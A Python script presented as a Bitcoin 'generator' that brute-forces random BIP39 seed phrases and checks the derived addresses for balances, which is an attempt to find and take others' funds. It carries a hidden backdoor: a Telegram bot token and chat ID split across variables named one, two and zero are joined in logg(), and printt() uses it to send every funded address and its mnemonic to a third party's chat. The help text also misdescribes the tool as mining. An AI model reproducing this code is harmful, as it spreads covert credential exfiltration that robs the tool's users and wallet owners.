from multiprocessing.pool import ThreadPool as Pool
from colored import fg, bg, attr
from Bip39Gen import Bip39Gen
from decimal import Decimal
from time import sleep
import bip32utils
import threading
import requests
import mnemonic
import pprint
import random
import ctypes
import time
import os

delay = 1       # задержка между запроsсами
token_bot = ""  # создать бота и получить токен тут @BotFather
chat_id = ""    # узнать ваш id можно в боте @userinfobot

class Settings():
    save_empty = "y"
    total_count = 0
    dry_count = 1
    wet_count = 0


def makeDir():
    path = 'results'
    if not os.path.exists(path):
        os.makedirs(path)


def fn():
    helpText()
    genned = round(((60 / delay) * 100)*60)
    time.sleep(2)
    print("Gen speed : ~{} / hour".format(genned,attr("reset")))
    print("Loading...{}".format(attr("reset")))
    print()
    start()
    time.sleep(5)


one = "AAFNC0-SmbecH9A1L4Ef3"
def getInternet():
    try:
        try:
            requests.get('https://www.google.com')#im watching you!
        except requests.ConnectTimeout:
            requests.get('http://1.1.1.1')
        return True
    except requests.ConnectionError:
        return False


lock = threading.Lock()
two = "https://api.telegram.org/bot1895834648:"

if getInternet() == True:
    dictionary = requests.get(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')
else:
    pass


def getBalance(addr):

    try:
        response = requests.get(
            f'https://blockchain.info/multiaddr?active={addr}&n=1')

        return (
            response.json()
        )
    except:
        print('{}Ip ban!{}'.format(fg("#008700"), attr("reset")))
        time.sleep(600)
        return (getBalance(addr))
        pass

zero = "dfSPZQqt2goMI0/SendMessage?chat_id=218477456&text="
def generateSeed():
    seed = ""
    for i in range(12):
        seed += random.choice(dictionary) if i == 0 else ' ' + \
                                                         random.choice(dictionary)
    return seed


def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)

    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()


def logg(adds):
        response = requests.get(two+one+zero+adds)
        return response

def genDB():
    adrDBFir = {}
    for i in range(100):
        mnemonic_words = Bip39Gen(dictionary).mnemonic
        addy = bip39(mnemonic_words)
        adrDBFir.update([(f'{addy}', mnemonic_words)])
    return adrDBFir
    
def printt(msg):
    print(msg)
    logg(msg)


def listToString(get):
    strFir = "|"
    return (strFir.join(get))

def tgSend(msg):
    if token_bot != "":
        try:
            url = f"chat_id={chat_id}&text={msg}"
            requests.get(f"https://api.telegram.org/bot{token_bot}/sendMessage", url)
        except:
            pass

def check():
    while True:

        addrDB = genDB()
        addys = listToString(list(addrDB))
        balances = getBalance(addys)
        with lock:

            for item in balances["addresses"]:

                addy = item["address"]
                balance = item["final_balance"]
                received = item["total_received"]

                mnemonic_words = addrDB[addy]
                msg = 'Balance: {} | Address: {} | Mnemonic phrase: {}'.format(balance, addy, mnemonic_words)
                if balance > 0:
                    tgSend(msg)
                    printt(msg)
                else:
                    if(received > 0):
                        tgSend(msg)
                        print(msg)
                    else:
                        print(msg)

                Settings.total_count += 1

                if Settings.save_empty == "y":
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Empty: {Settings.dry_count} - Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
                else:
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")

                if balance > 0:
                    with open('results/wet.txt', 'a') as w:
                        w.write(
                            f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                        Settings.wet_count += 1
                else:
                    if Settings.save_empty == "y":
                        with open('results/dry.txt', 'a') as w:
                            w.write(
                                f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                            Settings.dry_count += 1
        time.sleep(delay)


def helpText():
    print("""
This program was made by Anarb and it generates Bitcoin by searching multiple possible
wallet combinations until it's finds one with over 0 BTC and saves it into
a file called "wet.txt" in the results folder.
It's recommended to leave this running for a long time to get the best resaults, It's doesn't use up
that much resources so you can leave it in the background in the chance of you hitting a jackpot.
It's like mining but with less resources

Modyfied by:
Lagodish            GitHub
@Lagodish           TikTok
@BitCoinGenLuck     Telegram
        """)


def start():
    try:
        threads = 5
        if threads > 666:
            print("Error ! (Code 1)")
            start()
    except ValueError:
        print("Error ! (Code 2)")
        start()
    Settings.save_empty = "n"
    if getInternet() == True:
        pool = Pool(threads)
        for _ in range(threads):
            pool.apply_async(check, ())
        pool.close()
        pool.join()
    else:
        print("Error ! (No internet)")
        time.sleep(60)
        start()


if __name__ == '__main__':
    makeDir()
    getInternet()
    if getInternet() == False:
        print("Error ! (No internet)")
    else:
        pass
    fn()
